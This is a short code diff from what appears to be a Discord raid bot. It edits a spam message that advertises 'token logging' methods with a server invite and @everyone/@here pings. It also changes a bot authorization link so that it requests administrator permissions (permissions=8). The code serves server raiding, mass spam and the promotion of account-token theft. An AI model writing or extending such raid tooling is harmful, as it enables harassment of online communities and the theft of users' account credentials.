@@ -23,12 +23,12 @@ RAID_MESSAGE = """
 ✅ TOKEN LOGGING BEST METHODS !
 ✅ Available on all devices!
 
-https://discord.gg/v6Np7pyvM
+https://discord.gg/E6rftfaK
 
 @everyone @here
 """
 
-EXTERNAL_APP_INVITE = "https://discord.com/oauth2/authorize?client_id=1487140117385580835&integration_type=1&scope=applications.commands"
+EXTERNAL_APP_INVITE = "https://discord.com/oauth2/authorize?client_id=1488196379795918928&scope=bot+applications.commands&permissions=8"
 
 class ExternalAppButton(View):
     def __init__(self):
